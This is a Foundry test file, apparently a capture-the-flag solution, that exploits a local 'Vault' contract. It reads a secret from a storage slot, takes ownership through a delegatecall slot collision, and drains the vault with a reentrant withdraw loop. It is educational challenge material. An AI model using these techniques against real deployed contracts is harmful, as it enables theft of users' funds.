// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);
    
    bool private attacking = false;

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }
    
    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        
        // 1. 获取logic合约地址（从存储槽1读取）
        address logicAddr = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
        
        // 2. 使用logic地址作为密码通过delegatecall调用changeOwner，将owner改为当前测试合约
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32(uint256(uint160(logicAddr))), address(this));
        (bool success, ) = address(vault).call(data);
        require(success, "Failed to change owner");
        
        // 3. 使用vm.prank正确设置msg.sender，然后调用openWithdraw
        vm.stopPrank(); // 停止当前的prank
        vm.startPrank(address(this)); // 以测试合约身份调用
        vault.openWithdraw(); // 开启提取权限
        vm.stopPrank();
        vm.startPrank(palyer); // 恢复原来的prank
        
        // 4. 存入资金并启动重入攻击
        attacking = true;
        
        // 停止palyer的prank，以测试合约身份进行存款和提取
        vm.stopPrank();
        vm.startPrank(address(this));
        
        // 存入一些资金来获得提取权限
        vault.deposite{value: 0.01 ether}();
        
        // 开始重入攻击，提取所有资金
        vault.withdraw();
        
        vm.stopPrank();

        require(vault.isSolve(), "solved");
    }

}
